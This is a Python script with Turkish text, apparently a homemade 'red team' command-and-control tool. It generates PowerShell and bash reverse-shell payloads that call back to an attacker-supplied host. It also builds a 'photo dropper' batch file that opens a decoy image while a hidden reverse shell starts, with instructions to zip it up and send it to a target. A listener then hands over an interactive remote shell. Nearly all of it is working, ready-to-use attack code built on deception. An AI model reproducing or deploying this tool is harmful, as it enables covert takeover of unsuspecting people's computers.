#!/usr/bin/env python3
"""
RedTeam Command & Control (C2) Framework
========================================
Sızma testleri için Payload oluşturucu ve Dinleyici (Listener) bir arada.
Payload'lar bir kapak dosyası (resim vb.) ile paketlenebilir.
"""
import os
import sys
import socket
import shutil

# ANSI Renk Kodları
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{C.RED}{C.BOLD}
    ██▀███  ▓█████ ▓█████▄▄▄█████▓▓█████  ▄▄▄       ███▄ ▄███▓
   ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓  ██▒ ▓▒▓█   ▀ ▒████▄    ▓██▒▀█▀ ██▒
   ▓██ ░▄█ ▒▒███   ░██   █▌▒ ▓██░ ▒░▒███   ▒██  ▀█▄  ▓██    ▓██░
   ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░ ▓██▓ ░ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██ 
   ░██▓ ▒██▒░▒████▒░▒████▓   ▒██▒ ░ ░▒████▒ ▓█   ▓██▒▒██▒   ░██▒
   ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒   ▒ ░░   ░░ ▒░ ░ ▒▒   ▓▒█░░ ▒░   ░  ░
     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒     ░     ░ ░  ░  ▒   ▒▒ ░░  ░      ░
     ░░   ░    ░    ░ ░  ░   ░         ░     ░   ▒   ░      ░   
      ░        ░  ░   ░                ░  ░      ░  ░       ░   
                    ░                                           
        {C.CYAN}--- C2 Framework v3.0 | Dropper Edition ---{C.RESET}
"""
    print(banner)

def print_line():
    print(f"{C.DIM}{'─' * 60}{C.RESET}")

def save_payload(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        print(f"\n{C.GREEN}[+] Payload oluşturuldu: {os.path.abspath(filename)}{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}[-] Dosya yazma hatası: {e}{C.RESET}")

def payload_builder_menu():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] Payload Builder Modülü Başlatıldı{C.RESET}\n")
    print_line()

    lhost = input(f"{C.CYAN}  [?] LHOST (Saldırgan IP)   : {C.RESET}").strip()
    lport = input(f"{C.CYAN}  [?] LPORT (Saldırgan Port)  : {C.RESET}").strip()

    if not lhost or not lport:
        print(f"{C.RED}  [-] Hata: Geçersiz IP veya Port.{C.RESET}")
        input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
        return

    print_line()
    print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
    print(f"  {C.CYAN}1){C.RESET} Windows")
    print(f"  {C.CYAN}2){C.RESET} Linux")

    os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()

    if os_choice == '1':
        print_line()
        print(f"\n{C.BLUE}{C.BOLD}  --- Payload Formatı ---{C.RESET}")
        print(f"  {C.CYAN}1){C.RESET} Düz Batch (.bat)  {C.DIM}— Basit, test için ideal{C.RESET}")
        print(f"  {C.CYAN}2){C.RESET} Fotoğraf Dropper   {C.DIM}— Resim açılır, shell arka planda çalışır{C.RESET}")

        fmt_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()

        ps_payload = f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

        if fmt_choice == '1':
            bat_content = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{ps_payload}"'
            save_payload("windows_payload.bat", bat_content)

        elif fmt_choice == '2':
            print_line()
            print(f"\n{C.MAGENTA}{C.BOLD}  --- Fotoğraf Dropper Modu ---{C.RESET}")
            print(f"{C.DIM}  Hedef bu dosyayı açtığında ekranında bir fotoğraf açılır,")
            print(f"  ama arka planda gizlice reverse shell başlar.{C.RESET}\n")

            img_path = input(f"{C.CYAN}  [?] Kapak fotoğrafının yolu (PNG/JPG): {C.RESET}").strip().strip('"')

            if not os.path.exists(img_path):
                print(f"{C.RED}  [-] Hata: Fotoğraf bulunamadı: {img_path}{C.RESET}")
                input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
                return

            img_ext = os.path.splitext(img_path)[1]
            img_name = f"photo{img_ext}"

            # Oluşturulacak klasör
            output_dir = "dropper_package"
            os.makedirs(output_dir, exist_ok=True)

            # Fotoğrafı paketin içine kopyala
            shutil.copy2(img_path, os.path.join(output_dir, img_name))

            # Dropper bat dosyası: önce fotoğrafı aç, sonra gizlice shell başlat
            dropper_bat = f"""@echo off
start "" "{img_name}"
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{ps_payload}"
"""
            save_payload(os.path.join(output_dir, "open_photo.bat"), dropper_bat)

            print(f"\n{C.GREEN}{C.BOLD}  [+] DROPPER PAKETİ HAZIR!{C.RESET}")
            print(f"{C.GREEN}  [+] Klasör: {os.path.abspath(output_dir)}{C.RESET}")
            print(f"{C.DIM}  İçindekiler:{C.RESET}")
            print(f"{C.WHITE}    📷 {img_name}        {C.DIM}← Kapak fotoğrafı{C.RESET}")
            print(f"{C.WHITE}    📄 open_photo.bat   {C.DIM}← Hedefe gönderilecek dosya{C.RESET}")
            print(f"\n{C.YELLOW}  [!] Hedefe '{output_dir}' klasörünü ZIP olarak gönderin.")
            print(f"  [!] Hedef 'open_photo.bat' dosyasına tıkladığında:")
            print(f"      1. Ekranında fotoğraf açılır (şüphelenmez)")
            print(f"      2. Arka planda reverse shell başlar (gizli){C.RESET}")
        else:
            print(f"{C.RED}  [-] Geçersiz seçim.{C.RESET}")

    elif os_choice == '2':
        payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        save_payload("linux_payload.sh", payload)
    else:
        print(f"{C.RED}  [-] Geçersiz seçim.{C.RESET}")

    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

def start_listener():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] Listener (Dinleyici) Modülü Başlatıldı{C.RESET}\n")
    print_line()

    lport = input(f"{C.CYAN}  [?] Dinlenecek Port (Örn: 4444): {C.RESET}").strip()

    if not lport.isdigit():
        print(f"{C.RED}  [-] Hata: Geçersiz port numarası.{C.RESET}")
        input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
        return

    port = int(lport)
    print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor...{C.RESET}")
    print(f"{C.DIM}  Hedefin bağlantısı bekleniyor. (İptal: CTRL+C){C.RESET}\n")

    conn = None
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)

        conn, addr = s.accept()
        print_line()
        print(f"{C.RED}{C.BOLD}  [!] BAĞLANTI GELDİ!{C.RESET}")
        print(f"{C.GREEN}  [+] Hedef  : {addr[0]}:{addr[1]}{C.RESET}")
        print_line()
        print(f"{C.CYAN}  Komut yazın. Çıkmak için 'exit' yazın.{C.RESET}\n")

        while True:
            cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
            if cmd.lower() in ['exit', 'quit']:
                break

            if len(cmd) > 0:
                conn.send(str.encode(cmd + "\n"))
                client_response = str(conn.recv(4096), "utf-8", errors="replace")
                print(f"{C.WHITE}{client_response}{C.RESET}", end="")

    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}  [*] Dinleme iptal edildi.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}  [-] Bağlantı hatası: {e}{C.RESET}")
    finally:
        if conn:
            try:
                conn.close()
            except:
                pass
        if s:
            s.close()

    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(f"{C.BOLD}  AKTİF MODÜLLER:{C.RESET}\n")
        print(f"  {C.CYAN}1){C.RESET} Payload Builder   {C.DIM}— Hedef için dosya oluştur{C.RESET}")
        print(f"  {C.CYAN}2){C.RESET} Listener           {C.DIM}— Bağlantı dinle{C.RESET}")
        print(f"  {C.CYAN}0){C.RESET} Çıkış\n")

        choice = input(f"{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()

        if choice == '1':
            payload_builder_menu()
        elif choice == '2':
            start_listener()
        elif choice == '0':
            clear_screen()
            print(f"{C.RED}  [*] C2 Framework kapatılıyor... İyi avlar!{C.RESET}\n")
            sys.exit(0)

if __name__ == "__main__":
    main_menu()
